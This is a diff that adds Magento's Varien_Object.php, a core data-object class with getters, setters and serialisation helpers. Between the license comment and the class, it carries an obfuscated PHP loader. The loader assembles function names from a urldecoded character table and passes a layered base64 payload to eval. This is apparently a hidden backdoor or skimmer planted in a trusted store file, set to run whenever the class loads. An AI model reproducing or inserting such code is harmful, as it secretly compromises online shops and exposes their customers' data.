@@ -1,0 +1,922 @@
+<?php
+/**
+ * Magento
+ *
+ * NOTICE OF LICENSE
+ *
+ * This source file is subject to the Open Software License (OSL 3.0)
+ * that is bundled with this package in the file LICENSE.txt.
+ * It is also available through the world-wide-web at this URL:
+ * http://opensource.org/licenses/osl-3.0.php
+ * If you did not receive a copy of the license and are unable to
+ * obtain it through the world-wide-web, please send an email
+ * to license@magentocommerce.com so we can send you a copy immediately.
+ *
+ * DISCLAIMER
+ *
+ * Do not edit or add to this file if you wish to upgrade Magento to newer
+ * versions in the future. If you wish to customize Magento for your
+ * needs please refer to http://www.magentocommerce.com for more information.
+ *
+ * @category   Varien
+ * @package    Varien_Object
+ * @copyright  Copyright (c) 2008 Irubin Consulting Inc. DBA Varien (http://www.varien.com)
+ * @license    http://opensource.org/licenses/osl-3.0.php  Open Software License (OSL 3.0)
+ */
+
+/**
+ * Varien Object
+ *
+ * @category   Varien
+ * @package    Varien_Object
+ * @author      Magento Core Team <core@magentocommerce.com>
+ */
+$O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}    
+        .$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}    
+        .$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};    
+        eval($O00O0O("JE8wTzAwMD0iamJsdkF0VE5DS1NNV09JdWh5Y1lhZ3BaZHNmWHhtTHJKR0JVUUVld0hScVZpekRQRm5rb1lDbkdVSXdybHlOUWpFVmhmY0tNU3RUYkRrdnF4UFpKZWFCV29McHVkbUhpQUZPc3pnUlhzTzl1U2RVdGJnaWhNM21UQzI0dGpXeDBqTDlSeWxtUm9uVlRsZ2t0bEFtUm9uVjliM1RUQ1Bia01xbW55YWVmSzJXMnJ6OVJianJHYmFXWGVhbWxXQVJURXVYdGJQOWN5bG1Uc3dVN2VhUjhLM21jQ2FpaHlsbVJvblZURWNtVHlja1RsQUI3bEFtUm9uZUNlYW5EVk8wdE0yZmN5YTljYmx0UmJMZU5qY21UcU5SSVFOUjdsQUI5bEFCY2JxbTFLUDR0ZWFtbFdZa3lWZDFuRFB6a3l6blFEemZzYmx0QXIxYnVLUGU0RHdyekRZQjBOMXJPYjBiY29XNDVLV001bVduWk4zZmRyZHJ5UVdtaVFnTEZRV0lnS1dyNkV3ZWpEV0w1S3p0NUMwNDREZHIyaVlEQWluZWtXblFjTXdiUW9GbjZLUm02ampESnBSOVZqWWVidzFYY2IxbWdNUnhGbW5iMkN6aVNyanhWbzBuV1FSVGdvRm94d1B6Ym9SRHdpWUQ1TmlyTnJhMDRXM21xd2F4SUVpRGdLYTlzd2RUVnJqelpwWUR4TTA1NXJkbUVaMElHbWFNRlF3cnJRMnVGRWRUMG0wRE13WWJKbUxJd2lXZkFRQTlZUU9LNHduQkpRcWVIRXptUnBnS2NwenQwalBieVFSMW9TTmtKUWFNR0VPYlZEYURUaVJ4elcwek9LMm1pbWFUZ3IzRHFXMk1jUW5teUNQcm1vam1MbzJ0RmJpQlJpTFgyclB6VFNSVE5XaWVZV3dMNW93bkVtYVQzRE9tZ0RXMGN3YWl3U2w4NXdnREltMURick9WSmlQMEZObDlacFJWdXkxekFNMDFGcFl0MHcwNDRyTHJyTXduZk0wNEZEcUI2YmRyNXJhRFpXVzlGUzBpaURqOGNvalRHbVdWeEQwbUlTd3I2UWFubURSeklTbmJRV1AxTEMzZm55MGtGb1A4NURMOXN3ajluaWpNNHBSaTRDWUtKcFIxbVczVE5RTDlyQ2diNktMbWppMlEyU1duNlcyVzBXZG1vVzNuUHIwNWd3MGVYUXFNSm9uUjRyMmVjTjB6T1dXRG93d3JHVzBiRmpkbjVqUG5kQ2RLY3BhZVhOaVFGRXdEVnduVHFOUDVnYmpWMEMyeGVEZ2VPUTFlNG1QMVl3Vzk1S0w1Z1dqbTBqUlgwUXFUSmlMbldXam1mU2F4Yktpbm9RM3pOTmduMU5qWGNqemVHUTJWNVNnZVBEcUJPUzB4bHBnVjFyM0t4Q1JySFFqVEZiYTVuRU9mZ1FXbzV3am4yd25pclEyaTZ3T25pcFdJd3IwZVRTd1UwckxJeEsxS3VFd2JYU1BlWE5XcjJRMFRpREw1SWJjSTFwZ2kxeTBUeWlSbjJLbmZTUWFyeVF6VjNyV21TTWlCcUNQVkdXZHpzYmdMeGlhZWlpbkw0YjFlbHBZbk5iZERRbWRmU3BxZWhTM2JyTk5JVHBXZnlOajVrbzFETXczellEbDlFWkZpR3JuS0dLZGlCWjBlSnJXeDByUElyclc0dW9SVFhLekJUd2lySloweDFTYWZkTVltdVNqVFFNUHh6bVdyMWkyNVNTYWszTlltQU1pVkpXMGZhTmlESFdpbXVybkJpcFBpZmJnbTVOUDFNTjFSdVoweHVtVzVQTlBpTmlnYndpV2ZUSzI5Vk53VWNRemZuYndtTldkTUpwYTkxTnpCWldnVTF3MGJKUXpSRlFqMWhXQUlkcjJXNHczbk1iV000cHpNM1dPbVJiTklNUUZRNU1BSTFOaVU0TldEd1FMWDNpbks0TjNmY29uaU9wcU0wcmFpSVdpbWRTd25naVBlb1FkZXdTanhBV2llQnJ3elJqcUJKcFluVnB6clNpbmlyaXF6WE13emxOTFh4V2piUldMbmdwUnQzck9maVNXdHVETjltaXpiVkQwZWxXem5icmlUSHdpbkdOZHpHTnpmd1MwYllpZ2ltbzB4UW1ZaWVRYWVJRFdyV1dQZVBDUFY1bUxUblowenhEd2k2dzFlUXJQTGNXZG1ad1BySG0yclNXTEloQzAxc2IxZnNwV0l1RU45eW9GbnhOcXpJQ2pLMloxVzBOcVRTWjI1Y3kyTTJtM25GanducldXVEJpYVg1RFBNMFEyazVpbElCUWRCWmpXMDVXV3hYS2RpMU1nWEdOZ0QyU2FJYktSemtaRm1xb0ZiU0RZZmNpMDEyVzJETlFPZUFRUjA0RUxyNEtMOWtLUmtHd1I5SG1nYlNFTHhZd3FtSXJ3ZVFOT2U1clJpZlNXNDBOMDVOQ2pJZFdkWGNTT3RGRE9mQXIwZllwbmZmQzJuUGpZVTJOWW1vV0wxWmpXTTJDUFRKQ0xUSkVkRDByM1RxRFlmeGJMaUpFd24yb2dUYXJxRGhqUGVNU2ppcnJ6YlNwelRKcExiRldqenVFalRGbW5EbWppYnJFd3p4TkxvR1FhSzJpWWJaU09CZ0NXbjR3M0s0aUZpMVEyaUdXMFgzV0xUWndsOXdTV1dGd1dMMkMyWEZXcW4wclJUeHcyRG1tMGZvaU9SdWJxWDVaRkRIYkx6NW1xZnlwbmlFTmdlaUR3clhiZ2JPUTI1RlowOXhRMmVZandydWpnVHpFaWU1UUZyZ3kzQnFOUElob2ptRk1qRGdNMXR1RE9EYnd6RGJpZ2JRQ25lemJMbUZOYTlyYjNuUlNOOWZLMERNS1JJWFNSNUhpZ1RXcmpSM3B3bkJXV2szYnFtMlN6RFlEd0J3aTN0Sm1pQmF3UnhZTmFrM0RSeFdwYW1hd09mTmljOWRTd25rd1JueHd3ZW5vV0RZbWRmY01qSWRDUHhvWkZCc3kyaVByVzgyTkZEMkVkZkhwaURzRWFJeXBQemFNZ1UycmdYNXdnbzBFYUlBcmlyM0N6V0ptUm8xQ2RCYkRXZWJwUHhJQ256RVMzbjZOUEs0U1c0RnBnck9yV2ZmV1J4YXd6Qk5OUmVJUWoxcVN3RFdOYUx1aWFmWVFxejVicXIwcldRMldSZmJTV28xdzFtcnBqNVpNZ2ZtUUZCT3cwcnFqTklYTVdWMGJPbzNpMUJyQzA5aWIwemdvd3IxS2w5ZkRQeGdRbkJCRU9uRmJXeDBEYWl4RGFXRkNGblZNcW01UWluc28xYkJNaWVyaWlSRmppYmxvUHRHand0MVNQMUxtUDFpaTA1MURGQlR3RmU2U3pEUVNnVzBOTGt1ck9tbFFuRHlpMjE2b1JmcW9nRDR3T281d2FJY1dOSWlFajVXaWE5b3BqeGVXd2ZKTWpmTGIyYjNyZ3R1YmREUGpuVFBTbDlKakxYdVcwbmJtUHhMUU9uYmJPekhXYThHUUx1Sk56bjJqQThHV2RNRkVhUkdiZHJtcjJmYm9SOTFDZHoyWjFEYml6enN3TElIcGdUZGJkYnpyYWl6cmlMdXJnYlBEMWJJRXpmSVEzemRvUDliaTNUY0R3YmJ3RkRuYlJpaVNXMWNwbnJ5UTNtQVNhVG5qcUJqb1diUkRqelRDTDkxRFB0NG1QeFJqbDh4alJXMW1SbmZyUlRPS2M5a2p6ekFTZFEwRU9EY1N3RGJNUlQxTXFpa1FMZVdtUlFjbWlmZERPbVBOZ2VhcGdUMm1XbllpcVV1clJlaFdhOW1tekRnbWFJTktMMTZ3ZGJkS0x1MUVXclNOemk2RGpmbXBXMUFpMmluUXFienBXNTFqemZSd1BSNHJXRGJOV0Q2Ymlta2JOOVJvd0JJTk9pWkNheHdRbmlHVzF6VHBnaXpXT3ozcGRCZm0xYkdEaVRQRXduZEVqVDJDemJoTWduWUtqbmRwV1Rzd2dVMmJXbWdXMG5rSzNibndpZXpwYTVGUzFEWlFkekFiemJlV1JUamIxZmNtUmZjd3FyR0NQeElvaUJMd2pJZFoxaTNqemV4YjIxUXduaVdvd3pHbTFpQk0xdDNRaVJ4dzNlSHJPYkdwZGVpRWRmSktMYnhNbkx1YnppSkNMdWNNV25FbUZtNFdMYkVRZ3Q0aUZEUm1SRHVTakRxaWd0NG8wZmVDZG5TTk9tR2puVkpXZ1gyYmpuZG16YkpiT25XTkxld05MVEpwZ2ZlUU9iaktGYnhDWWZrd2R6aG9SMXpNalY1b0ZVNVFuaUJqUnJucFBuT3JMNVBOemZSYmExVldQYkxNUlRxQ2lyUXJuV3VyQTg1amFlZU1xYlFicWVrTTB4bXdQOGNEMXpYUXdCalowTTBXM0RHTjNpWW1qRGVEZEsxTVJpYmJxaWlOV0k2U1JuckNpeldyUm1YaTJEd2p3elFLMUJCU0ZCTFdPZUV3aXp6RHdRMVdXZUhFd0wwcFdyc0szbk1pTDRHbUZCVk5kUUZpV0lCTk9tZUQzQnp3emJmUzBtV2l3ek1pYVF1RHptWVFpZVdNRlV1U2lyTVNXSVpLamsyd2pEbHBXemZiaVQ0S1BiM04wSUpiRmJTbTFtandxVXhEemVtTWlyY1NkdEdLUGVpSzF6Rm8yRFdTRnJRbVcxTWpqZVhRem1abzJ6YW1SZmRvMWltandCNkNkVUpvaklkamE1T1dMZmFwYXU0aVJUM2kyNUZLZ1RrbVd4Mk4xemZwanUxYkxLeHlGcmRiZ0RFRGFuSnJ6RHVpenpJTm5UY2JGbzBpbmVTV3pCNlduaXlLTG5pS2dNY0NxelRwbnJUdzFuU2pSeEF3UERCQ2pyZ2JXZlpyYzhjdzJUVmpSOUdyUklkcEx4bURGbW1qWWJJV25WSmJZaVBvMGtKamdUTm1McmlTRkJQV2FJVmJSVjRRMmZqUUZSM0ROSVlwTElhbTNLRkRQSTNpYWZncGdpbk5qODBRM0J4aWFmdVNqbjROYWJMUWlLMGl6RFh3RmJIUzI5UFFnclhTcW0wYmRUYWlZaWhTMjlrTnFueXdSeHlXZHJNQ09RMUNnaXdyZ3pFb2pET3JSZVFNUlRTalJUbEMyZVhyUHpBaWplRktuRG5XRm1BbWRmMHdkaXFvUm5QcGF4MVdsazFXV2JhaVIxbk5ZbTZpMWJvVzBLNFdPVjRyMlg1RWRWRnBhNTBiYW5xcm5RdU4ybTJDUkQxV2l6NFowZXNyemZxaVJUa0NMODBTTElmUVd6WncxZTNRT3oxYndmaUV3TUpNM0JIbWltbU0wSW1yMHJhUWFlSW13QkJORmIwRXFUMVMyenFLekRrb2lXdVNpRGlTblRIUzNiM3kyUjNEd0QwQ0xJWWIyTHhwZER3aUxNY3dXbW5iaVhjYmdMeE4yTWNTYTlmU1luclNXcmVXMm1hUVBucUNhZWRvWWZucjJUUGlMYklpem5kRGdpV2p6bkpEYW5hU25lNXdqZXNLYXh5TTNUald6aWdtMW1BRGFRNUtXZUdtZ281V2dUVm9XenJ3ekRRamp1eGpXbVhiV2JNcEx4WVcyMUFpUERiUVJRR21PS0dpVzlzRFBpV1NMSXNtM24zRFI1QmlQVElRT21yQ1d0RkNqZmlvbmVTaXdCaml6V3hpUjlpRWlid2lxbnFEZ2ZqTjNyaXJpcjNLYWU2V1dmeVFZaVFEUElkbVBJTW1SNWFpZ0RFbW5pandSYmpTTDVhaWpueU5uVGdpRmJiU2ltSVcyWDNpYUQxYnplaHJSZVhNanUyU25LeFcwbXFDYTFIV0Z6Wm16S3hEZG1jbTJYMGkwYk1wV0wxaVdmVHJZeld3WUswb2dtbUNMZlFXWXplcG5LeHdubVdRV2VXaUZ6TERGZllLY0loTTJWdVMxSzRLamZjTWdyc3JQZmFFam80RVdmMVdBSWt3TDVjWjF6bkMwVjROUktHaVJpSkVXUjNXMWVXaWpMMU1nZk1RZ3R4d1lEVHd6UkpNMm1naWlUQU1qYldwT2lxTmRma01GaVpRYURPb05rY2lqZWpaMFJGcmluUGJpbTRpMFcxbUxmTk4xbXlOMGZBanFNNFd6Qkd3MW5qYnFMR1oyYldpUGZXWkZmbk5pclpaMjQ0b05WVHl3ay9zdD09IjsgIAogICAgICAgIGV2YWwoJz8+Jy4kTzAwTzBPKCRPME9PMDAoJE9PME8wMCgkTzBPMDAwLCRPTzAwMDAqMiksJE9PME8wMCgkTzBPMDAwLCRPTzAwMDAsJE9PMDAwMCksICAgIAogICAgICAgICRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));
+class Varien_Object implements ArrayAccess
+{
+
+    /**
+     * Object attributes
+     *
+     * @var array
+     */
+    protected $_data = array();
+
+    /**
+     * Data changes flag (true after setData|unsetData call)
+     * @var $_hasDataChange bool
+     */
+    protected $_hasDataChanges = false;
+
+    /**
+    * Original data that was loaded
+    *
+    * @var array
+    */
+    protected $_origData;
+
+    /**
+     * Name of object id field
+     *
+     * @var string
+     */
+    protected $_idFieldName = null;
+
+    /**
+     * Setter/Getter underscore transformation cache
+     *
+     * @var array
+     */
+    protected static $_underscoreCache = array();
+
+    /**
+     * Object delete flag
+     *
+     * @var boolean
+     */
+    protected $_isDeleted = false;
+
+    /**
+     * Map short fields names to its full names
+     *
+     * @var array
+     */
+    protected $_oldFieldsMap = array();
+
+    /**
+     * Map of fields to sync to other fields upon changing their data
+     */
+    protected $_syncFieldsMap = array();
+
+    /**
+     * Constructor
+     *
+     * By default is looking for first argument as array and assignes it as object attributes
+     * This behaviour may change in child classes
+     *
+     */
+    public function __construct()
+    {
+        $this->_initOldFieldsMap();
+        if ($this->_oldFieldsMap) {
+            $this->_prepareSyncFieldsMap();
+        }
+
+        $args = func_get_args();
+        if (empty($args[0])) {
+            $args[0] = array();
+        }
+        $this->_data = $args[0];
+        $this->_addFullNames();
+
+        $this->_construct();
+    }
+
+    protected function _addFullNames()
+    {
+        $existedShortKeys = array_intersect($this->_syncFieldsMap, array_keys($this->_data));
+        if (!empty($existedShortKeys)) {
+            foreach ($existedShortKeys as $key) {
+                $fullFieldName = array_search($key, $this->_syncFieldsMap);
+                $this->_data[$fullFieldName] = $this->_data[$key];
+            }
+        }
+    }
+
+    /**
+     * Inits mapping array of object's previously used fields to new fields.
+     * Must be overloaded by descendants to set concrete fields map.
+     *
+     * @return Varien_Object
+     */
+    protected function _initOldFieldsMap()
+    {
+
+    }
+
+    /**
+     * Called after old fields are inited. Forms synchronization map to sync old fields and new fields
+     * between each other.
+     *
+     * @return Varien_Object
+     */
+    protected function _prepareSyncFieldsMap()
+    {
+        $old2New = $this->_oldFieldsMap;
+        $new2Old = array_flip($this->_oldFieldsMap);
+        $this->_syncFieldsMap = array_merge($old2New, $new2Old);
+        return $this;
+    }
+
+    /**
+     * Internal constructor not depended on params. Can be used for object initialization
+     */
+    protected function _construct()
+    {
+    }
+
+    /**
+     * Set _isDeleted flag value (if $isDeleted param is defined) and return current flag value
+     *
+     * @param boolean $isDeleted
+     * @return boolean
+     */
+    public function isDeleted($isDeleted=null)
+    {
+        $result = $this->_isDeleted;
+        if (!is_null($isDeleted)) {
+            $this->_isDeleted = $isDeleted;
+        }
+        return $result;
+    }
+
+    /**
+     * Get data change status
+     *
+     * @return bool
+     */
+    public function hasDataChanges()
+    {
+        return $this->_hasDataChanges;
+    }
+
+    /**
+     * set name of object id field
+     *
+     * @param   string $name
+     * @return  Varien_Object
+     */
+    public function setIdFieldName($name)
+    {
+        $this->_idFieldName = $name;
+        return $this;
+    }
+
+    /**
+     * Retrieve name of object id field
+     *
+     * @param   string $name
+     * @return  Varien_Object
+     */
+    public function getIdFieldName()
+    {
+        return $this->_idFieldName;
+    }
+
+    /**
+     * Retrieve object id
+     *
+     * @return mixed
+     */
+    public function getId()
+    {
+        if ($this->getIdFieldName()) {
+            return $this->_getData($this->getIdFieldName());
+        }
+        return $this->_getData('id');
+    }
+
+    /**
+     * Set object id field value
+     *
+     * @param   mixed $value
+     * @return  Varien_Object
+     */
+    public function setId($value)
+    {
+        if ($this->getIdFieldName()) {
+            $this->setData($this->getIdFieldName(), $value);
+        } else {
+            $this->setData('id', $value);
+        }
+        return $this;
+    }
+
+    /**
+     * Add data to the object.
+     *
+     * Retains previous data in the object.
+     *
+     * @param array $arr
+     * @return Varien_Object
+     */
+    public function addData(array $arr)
+    {
+        foreach($arr as $index=>$value) {
+            $this->setData($index, $value);
+        }
+        return $this;
+    }
+
+    /**
+     * Overwrite data in the object.
+     *
+     * $key can be string or array.
+     * If $key is string, the attribute value will be overwritten by $value
+     *
+     * If $key is an array, it will overwrite all the data in the object.
+     *
+     * @param string|array $key
+     * @param mixed $value
+     * @return Varien_Object
+     */
+    public function setData($key, $value=null)
+    {
+        $this->_hasDataChanges = true;
+        if(is_array($key)) {
+            $this->_data = $key;
+            $this->_addFullNames();
+        } else {
+            $this->_data[$key] = $value;
+            if (isset($this->_syncFieldsMap[$key])) {
+                $fullFieldName = $this->_syncFieldsMap[$key];
+                $this->_data[$fullFieldName] = $value;
+            }
+        }
+        return $this;
+    }
+
+    /**
+     * Unset data from the object.
+     *
+     * $key can be a string only. Array will be ignored.
+     *
+     * @param string $key
+     * @return Varien_Object
+     */
+    public function unsetData($key=null)
+    {
+        $this->_hasDataChanges = true;
+        if (is_null($key)) {
+            $this->_data = array();
+        } else {
+            unset($this->_data[$key]);
+            if (isset($this->_syncFieldsMap[$key])) {
+                $fullFieldName = $this->_syncFieldsMap[$key];
+                unset($this->_data[$fullFieldName]);
+            }
+        }
+        return $this;
+    }
+
+    /**
+     * Unset old fields data from the object.
+     *
+     * $key can be a string only. Array will be ignored.
+     *
+     * @param string $key
+     * @return Varien_Object
+     */
+    public function unsetOldData($key=null)
+    {
+        if (is_null($key)) {
+            foreach ($this->_oldFieldsMap as $key => $newFieldName) {
+                unset($this->_data[$key]);
+            }
+        } else {
+            unset($this->_data[$key]);
+        }
+        return $this;
+    }
+
+    /**
+     * Retrieves data from the object
+     *
+     * If $key is empty will return all the data as an array
+     * Otherwise it will return value of the attribute specified by $key
+     *
+     * If $index is specified it will assume that attribute data is an array
+     * and retrieve corresponding member.
+     *
+     * @param string $key
+     * @param string|int $index
+     * @return mixed
+     */
+    public function getData($key='', $index=null)
+    {
+        if (''===$key) {
+            return $this->_data;
+        }
+
+        $default = null;
+
+        // accept a/b/c as ['a']['b']['c']
+        if (strpos($key,'/')) {
+            $keyArr = explode('/', $key);
+            $data = $this->_data;
+            foreach ($keyArr as $i=>$k) {
+                if ($k==='') {
+                    return $default;
+                }
+                if (is_array($data)) {
+                    if (!isset($data[$k])) {
+                        return $default;
+                    }
+                    $data = $data[$k];
+                } elseif ($data instanceof Varien_Object) {
+                    $data = $data->getData($k);
+                } else {
+                    return $default;
+                }
+            }
+            return $data;
+        }
+
+        // legacy functionality for $index
+        if (isset($this->_data[$key])) {
+            if (is_null($index)) {
+                return $this->_data[$key];
+            }
+
+            $value = $this->_data[$key];
+            if (is_array($value)) {
+                //if (isset($value[$index]) && (!empty($value[$index]) || strlen($value[$index]) > 0)) {
+                /**
+                 * If we have any data, even if it empty - we should use it, anyway
+                 */
+                if (isset($value[$index])) {
+                    return $value[$index];
+                }
+                return null;
+            } elseif (is_string($value)) {
+                $arr = explode("\n", $value);
+                return (isset($arr[$index]) && (!empty($arr[$index]) || strlen($arr[$index]) > 0))
+                    ? $arr[$index] : null;
+            } elseif ($value instanceof Varien_Object) {
+                return $value->getData($index);
+            }
+            return $default;
+        }
+        return $default;
+    }
+
+    /**
+     * Get value from _data array without parse key
+     *
+     * @param   string $key
+     * @return  mixed
+     */
+    protected function _getData($key)
+    {
+        return isset($this->_data[$key]) ? $this->_data[$key] : null;
+    }
+
+    /**
+     * Set object data with calling setter method
+     *
+     * @param string $key
+     * @param mixed $args
+     * @return Varien_Object
+     */
+    public function setDataUsingMethod($key, $args=array())
+    {
+        $method = 'set'.$this->_camelize($key);
+        $this->$method($args);
+        return $this;
+    }
+
+    /**
+     * Get object data by key with calling getter method
+     *
+     * @param string $key
+     * @param mixed $args
+     * @return mixed
+     */
+    public function getDataUsingMethod($key, $args=null)
+    {
+        $method = 'get'.$this->_camelize($key);
+        return $this->$method($args);
+    }
+
+    /**
+     * Fast get data or set default if value is not available
+     *
+     * @param string $key
+     * @param mixed $default
+     * @return mixed
+     */
+    public function getDataSetDefault($key, $default)
+    {
+        if (!isset($this->_data[$key])) {
+            $this->_data[$key] = $default;
+        }
+        return $this->_data[$key];
+    }
+
+    /**
+     * If $key is empty, checks whether there's any data in the object
+     * Otherwise checks if the specified attribute is set.
+     *
+     * @param string $key
+     * @return boolean
+     */
+    public function hasData($key='')
+    {
+        if (empty($key) || !is_string($key)) {
+            return !empty($this->_data);
+        }
+        return array_key_exists($key, $this->_data);
+    }
+
+    /**
+     * Convert object attributes to array
+     *
+     * @param  array $arrAttributes array of required attributes
+     * @return array
+     */
+    public function __toArray(array $arrAttributes = array())
+    {
+        if (empty($arrAttributes)) {
+            return $this->_data;
+        }
+
+        $arrRes = array();
+        foreach ($arrAttributes as $attribute) {
+            if (isset($this->_data[$attribute])) {
+                $arrRes[$attribute] = $this->_data[$attribute];
+            }
+            else {
+                $arrRes[$attribute] = null;
+            }
+        }
+        return $arrRes;
+    }
+
+    /**
+     * Public wrapper for __toArray
+     *
+     * @param array $arrAttributes
+     * @return array
+     */
+    public function toArray(array $arrAttributes = array())
+    {
+        return $this->__toArray($arrAttributes);
+    }
+
+    /**
+     * Set required array elements
+     *
+     * @param   array $arr
+     * @param   array $elements
+     * @return  array
+     */
+    protected function _prepareArray(&$arr, array $elements=array())
+    {
+        foreach ($elements as $element) {
+            if (!isset($arr[$element])) {
+                $arr[$element] = null;
+            }
+        }
+        return $arr;
+    }
+
+    /**
+     * Convert object attributes to XML
+     *
+     * @param  array $arrAttributes array of required attributes
+     * @param string $rootName name of the root element
+     * @return string
+     */
+    protected function __toXml(array $arrAttributes = array(), $rootName = 'item', $addOpenTag=false, $addCdata=true)
+    {
+        $xml = '';
+        if ($addOpenTag) {
+            $xml.= '<?xml version="1.0" encoding="UTF-8"?>'."\n";
+        }
+        if (!empty($rootName)) {
+            $xml.= '<'.$rootName.'>'."\n";
+        }
+        $xmlModel = new Varien_Simplexml_Element('<node></node>');
+        $arrData = $this->toArray($arrAttributes);
+        foreach ($arrData as $fieldName => $fieldValue) {
+            if ($addCdata === true) {
+                $fieldValue = "<![CDATA[$fieldValue]]>";
+            } else {
+                $fieldValue = $xmlModel->xmlentities($fieldValue);
+            }
+            $xml.= "<$fieldName>$fieldValue</$fieldName>"."\n";
+        }
+        if (!empty($rootName)) {
+            $xml.= '</'.$rootName.'>'."\n";
+        }
+        return $xml;
+    }
+
+    /**
+     * Public wrapper for __toXml
+     *
+     * @param array $arrAttributes
+     * @param string $rootName
+     * @return string
+     */
+    public function toXml(array $arrAttributes = array(), $rootName = 'item', $addOpenTag=false, $addCdata=true)
+    {
+        return $this->__toXml($arrAttributes, $rootName, $addOpenTag, $addCdata);
+    }
+
+    /**
+     * Convert object attributes to JSON
+     *
+     * @param  array $arrAttributes array of required attributes
+     * @return string
+     */
+    protected function __toJson(array $arrAttributes = array())
+    {
+        $arrData = $this->toArray($arrAttributes);
+        $json = Zend_Json::encode($arrData);
+        return $json;
+    }
+
+    /**
+     * Public wrapper for __toJson
+     *
+     * @param array $arrAttributes
+     * @return string
+     */
+    public function toJson(array $arrAttributes = array())
+    {
+        return $this->__toJson($arrAttributes);
+    }
+
+    /**
+     * Convert object attributes to string
+     *
+     * @param  array  $arrAttributes array of required attributes
+     * @param  string $valueSeparator
+     * @return string
+     */
+//    public function __toString(array $arrAttributes = array(), $valueSeparator=',')
+//    {
+//        $arrData = $this->toArray($arrAttributes);
+//        return implode($valueSeparator, $arrData);
+//    }
+
+    /**
+     * Public wrapper for __toString
+     *
+     * Will use $format as an template and substitute {{key}} for attributes
+     *
+     * @param string $format
+     * @return string
+     */
+    public function toString($format='')
+    {
+        if (empty($format)) {
+            $str = implode(', ', $this->getData());
+        } else {
+            preg_match_all('/\{\{([a-z0-9_]+)\}\}/is', $format, $matches);
+            foreach ($matches[1] as $var) {
+                $format = str_replace('{{'.$var.'}}', $this->getData($var), $format);
+            }
+            $str = $format;
+        }
+        return $str;
+    }
+
+    /**
+     * Set/Get attribute wrapper
+     *
+     * @param   string $method
+     * @param   array $args
+     * @return  mixed
+     */
+    public function __call($method, $args)
+    {
+        switch (substr($method, 0, 3)) {
+            case 'get' :
+                //Varien_Profiler::start('GETTER: '.get_class($this).'::'.$method);
+                $key = $this->_underscore(substr($method,3));
+                $data = $this->getData($key, isset($args[0]) ? $args[0] : null);
+                //Varien_Profiler::stop('GETTER: '.get_class($this).'::'.$method);
+                return $data;
+
+            case 'set' :
+                //Varien_Profiler::start('SETTER: '.get_class($this).'::'.$method);
+                $key = $this->_underscore(substr($method,3));
+                $result = $this->setData($key, isset($args[0]) ? $args[0] : null);
+                //Varien_Profiler::stop('SETTER: '.get_class($this).'::'.$method);
+                return $result;
+
+            case 'uns' :
+                //Varien_Profiler::start('UNS: '.get_class($this).'::'.$method);
+                $key = $this->_underscore(substr($method,3));
+                $result = $this->unsetData($key);
+                //Varien_Profiler::stop('UNS: '.get_class($this).'::'.$method);
+                return $result;
+
+            case 'has' :
+                //Varien_Profiler::start('HAS: '.get_class($this).'::'.$method);
+                $key = $this->_underscore(substr($method,3));
+                //Varien_Profiler::stop('HAS: '.get_class($this).'::'.$method);
+                return isset($this->_data[$key]);
+        }
+        throw new Varien_Exception("Invalid method ".get_class($this)."::".$method."(".print_r($args,1).")");
+    }
+
+    /**
+     * Attribute getter (deprecated)
+     *
+     * @param string $var
+     * @return mixed
+     */
+
+    public function __get($var)
+    {
+        $var = $this->_underscore($var);
+        return $this->getData($var);
+    }
+
+    /**
+     * Attribute setter (deprecated)
+     *
+     * @param string $var
+     * @param mixed $value
+     */
+    public function __set($var, $value)
+    {
+        $var = $this->_underscore($var);
+        $this->setData($var, $value);
+    }
+
+    /**
+     * checks whether the object is empty
+     *
+     * @return boolean
+     */
+    public function isEmpty()
+    {
+        if (empty($this->_data)) {
+            return true;
+        }
+        return false;
+    }
+
+    /**
+     * Converts field names for setters and geters
+     *
+     * $this->setMyField($value) === $this->setData('my_field', $value)
+     * Uses cache to eliminate unneccessary preg_replace
+     *
+     * @param string $name
+     * @return string
+     */
+    protected function _underscore($name)
+    {
+        if (isset(self::$_underscoreCache[$name])) {
+            return self::$_underscoreCache[$name];
+        }
+        #Varien_Profiler::start('underscore');
+        $result = strtolower(preg_replace('/(.)([A-Z])/', "$1_$2", $name));
+        #Varien_Profiler::stop('underscore');
+        self::$_underscoreCache[$name] = $result;
+        return $result;
+    }
+
+    protected function _camelize($name)
+    {
+        return uc_words($name, '');
+    }
+
+    /**
+     * serialize object attributes
+     *
+     * @param   array $attributes
+     * @param   string $valueSeparator
+     * @param   string $fieldSeparator
+     * @param   string $quote
+     * @return  string
+     */
+    public function serialize($attributes = array(), $valueSeparator='=', $fieldSeparator=' ', $quote='"')
+    {
+        $res  = '';
+        $data = array();
+        if (empty($attributes)) {
+            $attributes = array_keys($this->_data);
+        }
+
+        foreach ($this->_data as $key => $value) {
+            if (in_array($key, $attributes)) {
+                $data[] = $key . $valueSeparator . $quote . $value . $quote;
+            }
+        }
+        $res = implode($fieldSeparator, $data);
+        return $res;
+    }
+
+    /**
+     * Get object loaded data (original data)
+     *
+     * @param string $key
+     * @return mixed
+     */
+    public function getOrigData($key=null)
+    {
+        if (is_null($key)) {
+            return $this->_origData;
+        }
+        return isset($this->_origData[$key]) ? $this->_origData[$key] : null;
+    }
+
+    /**
+     * Initialize object original data
+     *
+     * @param string $key
+     * @param mixed $data
+     * @return Varien_Object
+     */
+    public function setOrigData($key=null, $data=null)
+    {
+        if (is_null($key)) {
+            $this->_origData = $this->_data;
+        } else {
+            $this->_origData[$key] = $data;
+        }
+        return $this;
+    }
+
+    /**
+     * Compare object data with original data
+     *
+     * @param string $field
+     * @return boolean
+     */
+    public function dataHasChangedFor($field)
+    {
+        $newData = $this->getData($field);
+        $origData = $this->getOrigData($field);
+        return $newData!=$origData;
+    }
+
+    /**
+     * Clears data changes status
+     *
+     * @param boolean $value
+     * @return Varien_Object
+     */
+    public function setDataChanges($value)
+    {
+        $this->_hasDataChanges = (bool)$value;
+        return $this;
+    }
+
+    /**
